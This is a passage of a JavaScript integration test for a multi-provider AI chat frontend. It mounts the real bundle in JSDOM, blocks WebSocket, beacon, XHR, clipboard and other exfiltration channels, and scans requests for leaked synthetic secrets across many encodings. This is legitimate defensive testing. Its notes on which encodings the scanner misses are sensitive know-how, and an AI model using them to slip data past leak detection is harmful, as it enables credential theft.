/**
 * Issue #415 — Integration tests for provider-switch isolation at the explicit-send boundary.
 *
 * Unlike #312/#317 quick-switch checks that stub destination callbacks or stop before sending,
 * these tests mount the real unmodified frontend bundle (`src/main.ts`) in an isolated JSDOM
 * realm with Service Worker disabled and all external network / non-HTTP channels blocked.
 *
 * Coverage boundaries (documented per #415 acceptance criteria):
 * - Encoded sentinels: reuses `scripts/lib/navigation-request-guard.mjs`, covering plain text,
 *   percent-encoding (multi-pass with malformed `%ZZ` resistance), `\uXXXX` / `\xXX` / HTML
 *   entities, nested JSON / form-urlencoded / multipart fields, up to 4 layers of Base64 /
 *   Base64url decoding, cross-field concatenation, and cross-request prefix/suffix byte-split
 *   fragments (plus raw `Blob`/`File`/`ArrayBuffer` UTF-8 + Base64 byte decoding in fetch mocks).
 *   NOT covered by this sentinel scanner: hex-only encoding, custom ciphers/XOR/ROT13,
 *   gzip/deflate compressed payloads, >4-layer encoding, or non-contiguous out-of-order chunks.
 * - Non-HTTP send paths: intercepts and fails closed on `WebSocket` (connections + string/binary
 *   `send` frames), `EventSource` (unexpected URLs/query/sentinels), `navigator.sendBeacon`,
 *   `XMLHttpRequest`, unprevented HTML `<form>` submission / `form.submit()`, `window.open`,
 *   `navigator.serviceWorker.register`, `navigator.clipboard.writeText`, and `window.postMessage`.
 *   NOT covered: real WebKit rendering/Service Worker runtime (WebKit system shared libraries are
 *   not installed in this offline test environment; real-WebKit navigation stays in `scripts/test-opencode-navigation.mjs`).
 */
import test from "node:test";
import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";
import { build } from "esbuild";
import { JSDOM } from "jsdom";
import {
  createRequestGuard,
  inspectRequest,
  isExpectedGet
} from "../scripts/lib/navigation-request-guard.mjs";

const ORIGIN = "https://devmoter.test";
const PROJECT_ID = "proj-415";
const PROJECT_PATH = "/synthetic/workspace-415";

const SYNTHETIC = {
  deviceToken: "SYNTHETIC_DEVICE_TOKEN_415_EXAMPLE",
  // OpenCode state & secrets
  ocSessionId: "synthetic-oc-session-415",
  ocHistoryUser: "SYNTHETIC_OC_HISTORY_USER_415",
  ocHistoryAssistant: "SYNTHETIC_OC_HISTORY_ASSISTANT_415",
  ocSentPrompt: "SYNTHETIC_OC_SENT_PROMPT_415",
  ocUnsentDraft: "SYNTHETIC_OC_UNSENT_DRAFT_415",
  ocAttachName: "synthetic-oc-secret-415.txt",
  ocAttachBody: "SYNTHETIC_OC_ATTACHMENT_BODY_415",
  ocUploadId: "SYNTHETIC_OC_UPLOAD_ID_415",
  // Codex state & secrets
  cxThreadId: "synthetic-cx-thread-415",
  cxModel: "synthetic-cx-only-model-415",
  cxHistoryUser: "SYNTHETIC_CX_HISTORY_USER_415",
  cxHistoryAssistant: "SYNTHETIC_CX_HISTORY_ASSISTANT_415",
  cxUnsentDraft: "SYNTHETIC_CX_UNSENT_DRAFT_415",
  cxAttachName: "synthetic-cx-secret-415.txt",
  cxAttachBody: "SYNTHETIC_CX_ATTACHMENT_BODY_415",
  cxUploadId: "SYNTHETIC_CX_UPLOAD_ID_415",
  cxSendPrompt: "SYNTHETIC_CX_EXPLICIT_SEND_415",
  cxNewAttachName: "synthetic-cx-new-415.txt",
  cxNewAttachBody: "SYNTHETIC_CX_NEW_BODY_415",
  cxNewUploadId: "SYNTHETIC_CX_NEW_UPLOAD_ID_415",
  // API Chat state & secrets
  apiProviderId: "synthetic-api-provider-415",
  apiSavedProviderId: "synthetic-saved-api-provider-415",
  apiVaultProviderId: "synthetic-vault-provider-415",
  apiModel: "synthetic-api-model-415",
  apiExternalBaseUrl: "https://api.provider-example.invalid/v1",
  apiVaultSecretRef: "secret://openai/synthetic-vault-secret-415",
  apiEnteredSecret: "SYNTHETIC_EXTERNAL_API_KEY_415_DUMMY",
  apiUnsavedSecret: "SYNTHETIC_UNSAVED_API_KEY_415_DUMMY",
  apiHistoryUser: "SYNTHETIC_API_HISTORY_USER_415",
  apiHistoryAssistant: "SYNTHETIC_API_HISTORY_ASSISTANT_415",
  apiUnsentDraft: "SYNTHETIC_API_UNSENT_DRAFT_415",
  apiAttachName: "synthetic-api-image-415.png",
  apiAttachBody: "SYNTHETIC_API_IMAGE_BYTES_415",
  apiAttachId: "41500001-0000-4000-8000-000000000001",
  apiSendPrompt: "SYNTHETIC_API_EXPLICIT_SEND_415",
  apiNewAttachName: "synthetic-api-new-415.png",
  apiNewAttachBody: "SYNTHETIC_API_NEW_IMAGE_BYTES_415",
  apiNewAttachId: "41500002-0000-4000-8000-000000000002",
};

const bundledApp = await build({
  entryPoints: [fileURLToPath(new URL("../src/main.ts", import.meta.url))],
  bundle: true,
  format: "iife",
  platform: "browser",
  target: "es2022",
  write: false,
  loader: { ".css": "empty" },
  logLevel: "silent"
});
const MAIN_BUNDLE_CODE = bundledApp.outputFiles[0]?.text;
assert.ok(MAIN_BUNDLE_CODE && MAIN_BUNDLE_CODE.length > 0, "src/main.ts must bundle cleanly");

const tick = (ms = 25) => new Promise(resolve => setTimeout(resolve, ms));

async function waitFor(predicate, label, timeoutMs = 3000, onTimeout = null) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (predicate()) return;
    await tick(10);
  }
  const extra = onTimeout ? `\n${onTimeout()}` : "";
  throw new Error(`Timed out waiting for: ${label}${extra}`);
}

function normalizeHeaders(rawHeaders) {
  const map = {};
  if (!rawHeaders) return map;
  const iterable = typeof rawHeaders.entries === "function"
    ? rawHeaders.entries()
    : Array.isArray(rawHeaders) ? rawHeaders : Object.entries(rawHeaders);
  for (const [k, v] of iterable) map[String(k).toLowerCase()] = String(v);
  return map;
}

async function readBlobBytes(blob, windowRef) {
  if (typeof blob.arrayBuffer === "function") {
    return Buffer.from(await blob.arrayBuffer());
  }
  const Reader = windowRef?.FileReader || globalThis.FileReader;
  if (Reader) {
    const buffer = await new Promise((resolve, reject) => {
      const reader = new Reader();
      reader.onload = () => resolve(reader.result);
      reader.onerror = () => reject(reader.error || new Error("Failed to read Blob"));
      reader.readAsArrayBuffer(blob);
    });
    return Buffer.from(buffer);
  }
  return Buffer.from(String(blob));
}

async function serializeBody(body, windowRef) {
  if (body == null) return { text: "", base64: "" };
  if (typeof body === "string") return { text: body, base64: "" };
  if (body instanceof URLSearchParams || (windowRef?.URLSearchParams && body instanceof windowRef.URLSearchParams)) {
    return { text: body.toString(), base64: "" };
  }
  const isBlobLike = typeof body.arrayBuffer === "function" ||
    (windowRef?.Blob && body instanceof windowRef.Blob) ||
    (typeof Blob !== "undefined" && body instanceof Blob);
  if (isBlobLike) {
    const buf = await readBlobBytes(body, windowRef);
    return { text: buf.toString("utf8"), base64: buf.toString("base64") };
  }
  if (body instanceof ArrayBuffer || ArrayBuffer.isView(body)) {
    const view = body instanceof ArrayBuffer ? new Uint8Array(body) : new Uint8Array(body.buffer, body.byteOffset, body.byteLength);
    const buf = Buffer.from(view);
    return { text: buf.toString("utf8"), base64: buf.toString("base64") };
  }
  if (typeof body.entries === "function") {
    const parts = [];
    for (const [k, v] of body.entries()) {
      const vIsBlob = v && (typeof v.arrayBuffer === "function" || (windowRef?.Blob && v instanceof windowRef.Blob));
      if (vIsBlob) {
        const buf = await readBlobBytes(v, windowRef);
        parts.push(`${k}=${buf.toString("utf8")}`);
      } else {
        parts.push(`${k}=${String(v)}`);
      }
    }
    return { text: parts.join("&"), base64: "" };
  }
  return { text: String(body), base64: "" };
}

const SAME_ORIGIN_DEVICE_TOKEN_PATHS = [
  "/api/llm/",
  "/api/secrets",
  "/api/tools-ai/",
  "/api/office/",
  "/api/workspace-control",
  "/api/agent-runs"
];

function isDeviceAuthPath(pathname) {
  return SAME_ORIGIN_DEVICE_TOKEN_PATHS.some(prefix => pathname === prefix || pathname.startsWith(prefix));
}

function isAllowedHydrationGet(pathname, search) {
  if (isExpectedGet({ url: `${ORIGIN}${pathname}${search}`, method: "GET", headers: {}, body: "" }, {
    origin: ORIGIN,
    allowedSessionIds: [SYNTHETIC.ocSessionId]
  })) return true;
  return !search && [
    "/api/opencode/location",
    "/api/opencode/command",
    "/api/opencode/skill",
    "/api/user-automation/slash",
    "/api/secrets/status",
    "/api/secrets"
  ].includes(pathname);
}

/**
 * Phase-aware send-boundary auditor combining #317 `navigation-request-guard.mjs`
 * multi-encoding / cross-request byte-split scanning with #415 explicit-send routing
 * and device-token vs provider-secret boundary enforcement.
 */
function createBoundaryAuditor({ origin = ORIGIN, deviceToken = SYNTHETIC.deviceToken } = {}) {
  let phase = "hydration";
  let target = "opencode";
  let preparingAttachmentFor = null;
  let forbiddenSentinels = [];
  let sentinelGuards = [];
  const credentialGuard = createRequestGuard({ origin, credential: deviceToken });
  const records = [];
  const violations = [];

  function setScope({ nextPhase, nextTarget, sentinels = [], preparingFor = null }) {
    if (nextPhase !== undefined) phase = nextPhase;
    if (nextTarget !== undefined) target = nextTarget;
    preparingAttachmentFor = preparingFor;
    forbiddenSentinels = sentinels.filter(item => item && item.value);
    sentinelGuards = forbiddenSentinels.map(item => ({
      label: item.label,
      value: item.value,
      guard: createRequestGuard({
        origin,
        credential: deviceToken,
        draft: item.value
      })
    }));
  }

  function inspectEndpointBoundary(record) {
    const findings = [];
    const { method, pathname, search, headers, body } = record;
    const tokenHeader = headers["x-devmoter-device-token"];
    if (tokenHeader !== undefined && !isDeviceAuthPath(pathname)) {
      findings.push(`device auth header sent to non-device-auth endpoint ${pathname}`);
    }
    if ("authorization" in headers || "x-api-key" in headers) {
      findings.push(`external provider auth header present on ${pathname}`);
    }

    if (phase === "hydration") {
      if (method === "GET" && isAllowedHydrationGet(pathname, search)) return findings;
      if (method === "POST" && pathname === "/api/codex/rpc" && !search) {
        try {
          const rpc = JSON.parse(body);
          if (["model/list", "thread/list", "thread/resume", "thread/read"].includes(rpc.method)) return findings;
        } catch { /* Fall through to reject. */ }
      }
      findings.push(`unexpected request during hydration: ${method} ${pathname}${search}`);
      return findings;
    }

    if (phase === "prepare-source") {
      // Explicit actions performed directly on the source provider before switching.
      if (method === "GET" && isAllowedHydrationGet(pathname, search)) return findings;
      if (target === "codex") {
        if (method === "GET" && pathname === "/api/dev/session-context") return findings;
        if (method === "POST" && ["/api/safety/guard", "/api/codex/upload", "/api/codex/rpc"].includes(pathname)) return findings;
      }
      if (target === "opencode") {
        if (method === "POST" && (["/api/safety/guard", "/api/codex/upload"].includes(pathname) || pathname.startsWith("/api/opencode/"))) return findings;
      }
      if (target === "api") {
        if (method === "POST" && ["/api/llm/attachments", "/api/llm/chat", "/api/llm/test", "/api/llm/providers"].includes(pathname)) return findings;
      }
      findings.push(`unexpected request during prepare-source (${target}): ${method} ${pathname}${search}`);
      return findings;
    }

    if (phase === "switch") {
      // Switching provider by itself must NEVER emit sends, uploads, guards, or provider config writes.
      if (method === "GET" && isAllowedHydrationGet(pathname, search)) return findings;
      if (method === "POST" && pathname === "/api/codex/rpc" && !search) {
        try {
          const rpc = JSON.parse(body);
          if (["model/list", "thread/list", "thread/read"].includes(rpc.method)) return findings;
        } catch { /* Reject malformed or mutating RPC during switch. */ }
      }
      findings.push(`switch phase emitted forbidden mutation/send: ${method} ${pathname}${search}`);
      return findings;
    }

    if (phase === "prepare-target-attachment") {
      if (method === "GET" && isAllowedHydrationGet(pathname, search)) return findings;
      if (preparingAttachmentFor === "codex" && method === "POST" && pathname === "/api/codex/upload" && !search) return findings;
      if (preparingAttachmentFor === "opencode" && method === "POST" && pathname === "/api/codex/upload" && !search) return findings;
      if (preparingAttachmentFor === "api" && method === "POST" && pathname === "/api/llm/attachments" && !search) return findings;
      findings.push(`unexpected request during target attachment upload (${preparingAttachmentFor}): ${method} ${pathname}`);
      return findings;
    }

    if (phase === "explicit-send") {
      if (method === "GET" && isAllowedHydrationGet(pathname, search)) return findings;
      if (target === "codex") {
        if (method === "POST" && pathname === "/api/safety/guard" && !search) return findings;
        if (method === "GET" && pathname === "/api/dev/session-context") return findings;
        if (method === "POST" && pathname === "/api/codex/rpc" && !search) {
          try {
            const rpc = JSON.parse(body);
            if (["thread/start", "turn/start", "thread/list", "thread/read", "model/list"].includes(rpc.method)) {
              if ("x-pocket-agent-mode" in headers || "x-pocket-project-id" in headers) {
                findings.push("OpenCode headers leaked into Codex RPC");
              }
              return findings;
            }
          } catch { /* Fall through. */ }
        }
        findings.push(`Codex explicit-send hit disallowed endpoint: ${method} ${pathname}${search}`);
        return findings;
      }

      if (target === "api") {
        if (method === "POST" && pathname === "/api/llm/chat" && !search) {
          if ("x-pocket-agent-mode" in headers || "x-pocket-project-id" in headers) {
            findings.push("OpenCode headers leaked into API Chat send");
          }
          return findings;
        }
        findings.push(`API Chat explicit-send hit disallowed endpoint: ${method} ${pathname}${search}`);
        return findings;
      }

      if (target === "opencode") {
        if (method === "POST" && pathname === "/api/safety/guard" && !search) return findings;
        if (method === "POST" && pathname === "/api/opencode/session" && !search) return findings;
        if (method === "POST" && /^\/api\/opencode\/session\/[^/]+\/prompt$/.test(pathname) && !search) return findings;
        findings.push(`OpenCode explicit-send hit disallowed endpoint: ${method} ${pathname}${search}`);
        return findings;
      }

      findings.push(`unexpected send while on ${target}: ${method} ${pathname}`);
      return findings;
    }

    findings.push(`unknown phase ${phase}`);
    return findings;
  }

  function inspect(rawRecord) {
    const parsedUrl = new URL(rawRecord.url, origin);
    const headers = normalizeHeaders(rawRecord.headers);
    const record = {
      ...rawRecord,
      phase,
      target,
      url: parsedUrl.href,
      origin: parsedUrl.origin,
      pathname: parsedUrl.pathname,
      search: parsedUrl.search,
      headers,
      body: String(rawRecord.body || "")
    };
    const findings = [];

    if (record.origin !== origin) findings.push(`external origin forbidden: ${record.origin}`);

    // Same-origin device credential check (allows ONLY x-devmoter-device-token header).
    // Endpoint allowlisting (including /api/codex/upload) is enforced by inspectEndpointBoundary().
    const ignoreEndpointRules = item =>
      item !== "unexpected non-static request" && item !== "unexpected attachment upload request";
    const credFindings = credentialGuard({
      url: record.url,
      method: record.method,
      headers: record.headers,
      body: record.rawBytesBase64 ? `${record.body}\n${record.rawBytesBase64}` : record.body
    }).filter(ignoreEndpointRules);
    findings.push(...credFindings);

    // Inspect every forbidden source sentinel through the #317 multi-encoding/split guard.
    const bodiesToScan = record.rawBytesBase64 ? [record.body, record.rawBytesBase64] : [record.body];
    for (const entry of sentinelGuards) {
      for (const bodyVariant of bodiesToScan) {
        const hit = entry.guard({
          url: record.url,
          method: record.method,
          headers: record.headers,
          body: bodyVariant
        }).filter(ignoreEndpointRules);
        if (hit.includes("draft content leaked")) {
          findings.push(`source sentinel leaked (${entry.label})`);
          break;
        }
        for (const extra of hit) {
          if (extra === "request normalization failed closed") findings.push(extra);
        }
      }
      // Also catch a sentinel placed inside x-devmoter-device-token itself.
      if (record.headers["x-devmoter-device-token"]?.toLowerCase().includes(entry.value.toLowerCase())) {
        findings.push(`source sentinel leaked inside device header (${entry.label})`);
      }
    }

    findings.push(...inspectEndpointBoundary(record));
    record.findings = [...new Set(findings)];
    records.push(record);
    violations.push(...record.findings.map(msg => `[${phase}:${target}] ${msg}`));
    return record;
  }

  return {
    inspect,
    setScope,
    getScope: () => ({ phase, target, preparingAttachmentFor }),
    records,
    violations,
    inPhase: p => records.filter(r => r.phase === p)
  };
}

/**
 * Mounts the real `src/main.ts` bundle inside a fresh JSDOM realm with:
 * - Service Worker registration disabled & controller === null
 * - External origins blocked
 * - Non-HTTP channels (`WebSocket`, `sendBeacon`, `XHR`, `EventSource`, native `form.submit`, `window.open`, `clipboard`, `postMessage`) trapped
 * - Synthetic same-origin mock responses for OpenCode, Codex, API Chat, Safety, and Secrets
 */
async function mountRealFrontend(t, {
  initialUrl = `${ORIGIN}/?surface=opencode&unifiedUI=1`,
  localStorageSeed = {},
  includeVaultProvider = false
} = {}) {
  const dom = new JSDOM('<!doctype html><html><body><div id="app"></div></body></html>', {
    url: initialUrl,
    runScripts: "outside-only"
  });
  t.after(() => dom.window.close());

  const w = dom.window;
  const auditor = createBoundaryAuditor();

  Object.defineProperty(w.HTMLElement.prototype, "inert", {
    get() { return this.hasAttribute("inert"); },
    set(value) { this.toggleAttribute("inert", Boolean(value)); }
  });
  w.HTMLElement.prototype.getClientRects = function () {
    return this.closest('.hidden, [hidden], [inert], [aria-hidden="true"]') ? [] : [{ width: 44, height: 44 }];
  };
  w.HTMLElement.prototype.scrollIntoView = () => {};
  w.matchMedia = () => ({ matches: false, addEventListener() {}, removeEventListener() {} });
  w.ResizeObserver = class { observe() {} unobserve() {} disconnect() {} };
  w.requestAnimationFrame = cb => w.setTimeout(cb, 0);
  w.cancelAnimationFrame = id => w.clearTimeout(id);
  w.confirm = () => true;
  w.Headers = Headers;
  w.Response = Response;
  w.AbortController = AbortController;
  w.URL.createObjectURL = file => `blob:${ORIGIN}/${file?.name || "synthetic"}`;
  w.URL.revokeObjectURL = () => {};

  const nonHttpEvents = {
    wsConnections: [],
    wsFrames: [],
    eventSources: [],
    beacons: [],
    xhrCalls: [],
    serviceWorkerRegisters: [],
    windowOpens: [],
    unpreventedFormSubmits: [],
    nativeFormSubmits: [],
    clipboardWrites: [],
    postMessages: [],
    unexpectedConsoleErrors: []
  };
  const origConsoleError = w.console.error.bind(w.console);
  w.console.error = (...args) => {
    const text = args.map(item => (item instanceof Error ? item.message : String(item))).join(" ");
    if (text.includes("Service Worker registration disabled in #415 isolation test")) return;
    nonHttpEvents.unexpectedConsoleErrors.push(text);
    origConsoleError(...args);
  };

  w.WebSocket = class BlockedWebSocket extends w.EventTarget {
    constructor(url) {
      super();
      nonHttpEvents.wsConnections.push(String(url));
      this.url = String(url);
      this.readyState = 3;
      w.queueMicrotask(() => this.dispatchEvent(new w.Event("error")));
    }
    send(data) {
      nonHttpEvents.wsFrames.push({ url: this.url, data: typeof data === "string" ? data : "[binary]" });
      throw new w.DOMException("WebSocket is closed", "InvalidStateError");
    }
    close() {}
  };

  w.XMLHttpRequest = class BlockedXHR {
    open(method, url) { this._req = { method: String(method), url: String(url), headers: {} }; }
    setRequestHeader(k, v) { if (this._req) this._req.headers[k] = v; }
    send(body) {
      nonHttpEvents.xhrCalls.push({ ...this._req, body: String(body ?? "") });
      throw new Error("XMLHttpRequest is blocked in #415 isolation test");
    }
  };

  const eventSourcesByPath = new Map();
  w.EventSource = class GuardedEventSource {
    constructor(url) {
      const resolved = new URL(String(url), ORIGIN);
      const allowedPaths = new Set(["/api/opencode/event", "/api/codex/events", "/api/agent-runs/events"]);
      const blocked = resolved.origin !== ORIGIN || Boolean(resolved.search) || !allowedPaths.has(resolved.pathname);
      nonHttpEvents.eventSources.push({ url: resolved.href, pathname: resolved.pathname, blocked, phase: auditor.getScope().phase });
      this.url = resolved.href;
      this.pathname = resolved.pathname;
      this.listeners = new Map();
      if (blocked) {
        w.queueMicrotask(() => this.onerror?.(new w.Event("error")));
      } else {
        eventSourcesByPath.set(this.pathname, this);
      }
    }
    addEventListener(name, fn) {
      const list = this.listeners.get(name) || [];
      list.push(fn);
      this.listeners.set(name, list);
    }
    emitMessage(payload) {
      const event = { data: JSON.stringify(payload) };
      this.onmessage?.(event);
      for (const fn of this.listeners.get("message") || []) fn(event);
    }
    emitEvent(name, payload) {
      const event = { data: JSON.stringify(payload) };
      for (const fn of this.listeners.get(name) || []) fn(event);
    }
    close() {}
  };

  Object.defineProperty(w.navigator, "sendBeacon", {
    configurable: true,
    value: (url, data) => {
      nonHttpEvents.beacons.push({ url: String(url), data: String(data ?? "") });
      return false;
    }
  });
  Object.defineProperty(w.navigator, "serviceWorker", {
    configurable: true,
    value: {
      controller: null,
      register: async scriptUrl => {
        nonHttpEvents.serviceWorkerRegisters.push(String(scriptUrl));
        throw new Error("Service Worker registration disabled in #415 isolation test");
      },
      getRegistrations: async () => []
    }
  });
  Object.defineProperty(w.navigator, "clipboard", {
    configurable: true,
    value: {
      writeText: async text => { nonHttpEvents.clipboardWrites.push(String(text)); }
    }
  });

  w.open = (url, target, features) => {
    nonHttpEvents.windowOpens.push({ url: String(url), target: String(target ?? ""), features: String(features ?? "") });
    return null;
  };
  const origPostMessage = w.postMessage.bind(w);
  w.postMessage = (message, targetOrigin, transfer) => {
    nonHttpEvents.postMessages.push({ message, targetOrigin });
    return origPostMessage(message, targetOrigin, transfer);
  };
  w.HTMLFormElement.prototype.submit = function () {
    nonHttpEvents.nativeFormSubmits.push({ id: this.id, action: this.action });
  };
  w.document.addEventListener("submit", event => {
    if (!event.defaultPrevented) {
      nonHttpEvents.unpreventedFormSubmits.push({ id: event.target?.id || "" });
      event.preventDefault();
    }
  });

  for (const [key, value] of Object.entries(localStorageSeed)) {
    w.localStorage.setItem(key, value);
  }

  let nextUploadSeq = 0;
  let nextApiAttachSeq = 0;
  let ocContextItems = [
    { type: "user", text: SYNTHETIC.ocHistoryUser },
    { type: "assistant", content: [{ type: "text", text: SYNTHETIC.ocHistoryAssistant }] },
    { type: "idle", outcome: "completed" }
  ];
  let cxTurns = [{
    id: "synthetic-turn-1",
    status: { type: "completed" },
    items: [
      { type: "userMessage", content: [{ type: "text", text: SYNTHETIC.cxHistoryUser }] },
      { type: "agentMessage", text: SYNTHETIC.cxHistoryAssistant }
    ]
  }];
  let apiProviders = [
    {
      id: SYNTHETIC.apiProviderId,
      name: "Synthetic API Provider",
      presetId: "openai",
      protocol: "openai-compatible",
      baseUrl: SYNTHETIC.apiExternalBaseUrl,
      ready: true,
      models: [SYNTHETIC.apiModel],
      reasoningModes: ["auto", "high"],
      source: "file",
      editable: true
    },
    ...(includeVaultProvider ? [{
      id: SYNTHETIC.apiVaultProviderId,
      name: "Synthetic Vault Provider",
      presetId: "openai",
      protocol: "openai-compatible",
      baseUrl: SYNTHETIC.apiExternalBaseUrl,
      ready: true,
      secretRef: SYNTHETIC.apiVaultSecretRef,
      projectId: PROJECT_ID,
      credentialSource: "vault",
      models: [SYNTHETIC.apiModel],
      reasoningModes: ["auto"],
      source: "file",
      editable: true
    }] : [])
  ];

  const jsonReply = (payload, status = 200) => new Response(JSON.stringify(payload), {
    status,
    headers: { "content-type": "application/json" }
  });

  w.fetch = async (input, init = {}) => {
    const rawUrl = typeof input === "string" ? input : input?.url || String(input);
    const resolved = new URL(rawUrl, ORIGIN);
    const method = String(init.method || (typeof input === "object" && input?.method) || "GET").toUpperCase();
    const { text: bodyText, base64: rawBytesBase64 } = await serializeBody(init.body, w);
    const audited = auditor.inspect({
      url: resolved.href,
      method,
      headers: init.headers || {},
      body: bodyText,
      rawBytesBase64
    });

    if (resolved.origin !== ORIGIN) {
      throw new TypeError(`Blocked external network access: ${resolved.origin}`);
    }
    if (audited.findings.length > 0) {
      return jsonReply({ error: `Audit blocked: ${audited.findings.join("; ")}` }, 403);
    }

    const { pathname } = resolved;
    if (pathname === "/api/health") {
      return jsonReply({
        online: true,
        backends: { opencode: { online: true }, codex: { online: true } }
      });
    }
    if (pathname === "/api/projects") {
      return jsonReply({
        projects: [{ id: PROJECT_ID, name: "Synthetic Project 415", path: PROJECT_PATH, available: true }]
      });
    }
    if (pathname === "/api/agent-runs") return jsonReply({ runs: [], fleets: [] });
    if (pathname === "/api/dev/session-context") return jsonReply({ developerInstructions: "" });
    if (pathname === "/api/safety/guard") return jsonReply({ decision: "allow", findings: [] });
    if (pathname === "/api/user-automation/slash") return jsonReply({ commands: [] });
    if (pathname === "/api/secrets/status") return jsonReply({ initialized: true, unlocked: true, count: 1 });
    if (pathname === "/api/secrets") {
      return jsonReply({
        secrets: [{
          reference: SYNTHETIC.apiVaultSecretRef,
          provider: "openai",
          name: "synthetic-vault-secret-415",
          purpose: "synthetic test",
          projectIds: [PROJECT_ID]
        }]
      });
    }

    // OpenCode synthetic endpoints
    if (pathname === "/api/opencode/location") return jsonReply({ directory: PROJECT_PATH });
    if (pathname === "/api/opencode/pocket/providers") {
      return jsonReply({
        all: [{ id: "synthetic-oc", name: "Synthetic OpenCode", models: { "synthetic-oc-m1": { id: "synthetic-oc-m1", name: "Synthetic OC Model" } } }],
        default: { "synthetic-oc": "synthetic-oc-m1" },
        connected: ["synthetic-oc"]
      });
    }
    if (pathname === "/api/opencode/agent") return jsonReply([{ id: "build", name: "Build", mode: "primary" }]);
    if (pathname === "/api/opencode/command" || pathname === "/api/opencode/skill") return jsonReply([]);
    if (pathname === "/api/opencode/session") {
      if (method === "POST") {
        return jsonReply({ id: SYNTHETIC.ocSessionId, title: "Synthetic OC Session", time: { updated: 1700000000000 } });
      }
      return jsonReply([{ id: SYNTHETIC.ocSessionId, title: "Synthetic OC Session", time: { updated: 1700000000000 } }]);
    }
    if (pathname === "/api/opencode/session/active") return jsonReply({});
    if (pathname === `/api/opencode/session/${SYNTHETIC.ocSessionId}/context`) {
      return jsonReply(ocContextItems);
    }
    if (pathname.startsWith(`/api/opencode/session/${SYNTHETIC.ocSessionId}/`)) {
      if (pathname.endsWith("/prompt")) {
        const promptData = JSON.parse(bodyText || "{}");
        ocContextItems = [
          ...ocContextItems,
          { type: "user", text: String(promptData.text || "") },
          { type: "assistant", content: [{ type: "text", text: "SYNTHETIC_OC_LIVE_REPLY_415" }] },
          { type: "idle", outcome: "completed" }
        ];
        w.queueMicrotask(() => {
          eventSourcesByPath.get("/api/opencode/event")?.emitMessage({
            type: "session.idle",
            properties: { sessionID: SYNTHETIC.ocSessionId }
          });
        });
        return jsonReply({ ok: true });
      }
      return jsonReply([]);
    }

    // Codex synthetic endpoints
    if (pathname === "/api/codex/upload") {
      nextUploadSeq += 1;
      const uploadName = JSON.parse(bodyText || "{}").name;
      const uploadId = uploadName === SYNTHETIC.cxNewAttachName
        ? SYNTHETIC.cxNewUploadId
        : uploadName === SYNTHETIC.cxAttachName
          ? SYNTHETIC.cxUploadId
          : uploadName === SYNTHETIC.ocAttachName
            ? SYNTHETIC.ocUploadId
            : `synthetic-upload-${nextUploadSeq}`;
      return jsonReply({ ok: true, uploadId });
    }
    if (pathname === "/api/codex/rpc") {
      const rpc = JSON.parse(bodyText || "{}");
      if (rpc.method === "model/list") {
        return jsonReply({ result: { data: [{ id: SYNTHETIC.cxModel, model: SYNTHETIC.cxModel, displayName: "Synthetic Codex", isDefault: true }] } });
      }
      if (rpc.method === "thread/list") {
        return jsonReply({ result: { data: [{ id: SYNTHETIC.cxThreadId, name: "Synthetic CX Thread", cwd: PROJECT_PATH }] } });
      }
      if (rpc.method === "thread/resume") {
        return jsonReply({ result: { model: SYNTHETIC.cxModel, cwd: PROJECT_PATH } });
      }
      if (rpc.method === "thread/read") {
        return jsonReply({
          result: {
            thread: {
              id: SYNTHETIC.cxThreadId,
              status: { type: "idle" },
              turns: cxTurns
            }
          }
        });
      }
      if (rpc.method === "thread/start") return jsonReply({ result: { thread: { id: SYNTHETIC.cxThreadId } } });
      if (rpc.method === "turn/start") {
        const textItem = Array.isArray(rpc.params?.input) ? rpc.params.input.find(item => item?.type === "text") : null;
        cxTurns = [
          ...cxTurns,
          {
            id: `synthetic-turn-${cxTurns.length + 1}`,
            status: { type: "completed" },
            items: [
              { type: "userMessage", content: [{ type: "text", text: String(textItem?.text || "") }] },
              { type: "agentMessage", text: "SYNTHETIC_CX_LIVE_REPLY_415" }
            ]
          }
        ];
        w.queueMicrotask(() => {
          eventSourcesByPath.get("/api/codex/events")?.emitEvent("notification", {
            method: "turn/completed",
            params: { threadId: SYNTHETIC.cxThreadId, turn: { id: `synthetic-turn-${cxTurns.length}`, status: { type: "completed" } } }
          });
        });
        return jsonReply({ result: { turn: { id: `synthetic-turn-${cxTurns.length}` } } });
      }
    }

    // API Chat synthetic endpoints
    if (pathname === "/api/llm/presets") {
      return jsonReply({
        presets: [{ id: "openai", name: "OpenAI", protocol: "openai-compatible", baseUrl: SYNTHETIC.apiExternalBaseUrl }]
      });
    }
    if (pathname === "/api/llm/providers") {
      if (method === "POST") {
        const saved = JSON.parse(bodyText || "{}");
        const created = {
          id: saved.id || SYNTHETIC.apiSavedProviderId,
          name: saved.name || "Saved Synthetic Provider",
          presetId: saved.presetId || "openai",
          protocol: saved.protocol || "openai-compatible",
          baseUrl: saved.baseUrl || SYNTHETIC.apiExternalBaseUrl,
          ready: true,
          models: saved.models?.length ? saved.models : [SYNTHETIC.apiModel],
          reasoningModes: ["auto"],
          source: "file",
          editable: true
        };
        apiProviders = [created, ...apiProviders.filter(p => p.id !== created.id)];
        return jsonReply({ provider: created });
      }
      return jsonReply({ providers: apiProviders });
    }
    if (pathname === "/api/llm/test") {
      return jsonReply({ ok: true, models: [SYNTHETIC.apiModel] });
    }
    if (pathname === "/api/llm/attachments") {
      nextApiAttachSeq += 1;
      const parsedName = decodeURIComponent(audited.headers["x-devmoter-file-name"] || "image.png");
      const id = parsedName === SYNTHETIC.apiNewAttachName ? SYNTHETIC.apiNewAttachId : SYNTHETIC.apiAttachId;
      return jsonReply({
        attachment: {
          id,
          name: parsedName,
          mime: "image/png",
          size: Buffer.from(rawBytesBase64, "base64").length
        }
      });
    }
    if (pathname === "/api/llm/chat") {
      const reqPayload = JSON.parse(bodyText || "{}");
      const lastUserText = Array.isArray(reqPayload.messages)
        ? [...reqPayload.messages].reverse().find(m => m?.role === "user")?.content
        : "";
      const content = lastUserText === SYNTHETIC.apiHistoryUser
        ? SYNTHETIC.apiHistoryAssistant
        : "SYNTHETIC_API_ASSISTANT_REPLY_415";
      return jsonReply({ message: { content } });
    }

    return jsonReply({ error: `Unhandled synthetic path: ${method} ${pathname}` }, 404);
  };

  w.eval(MAIN_BUNDLE_CODE);

  // Wait for hydration: health check + OpenCode context + Codex thread history + API providers + unified nav.
  await waitFor(
    () =>
      w.document.querySelector("#ocxTranscript")?.textContent.includes(SYNTHETIC.ocHistoryAssistant) &&
      w.document.querySelector("#cxTranscript")?.textContent.includes(SYNTHETIC.cxHistoryAssistant) &&
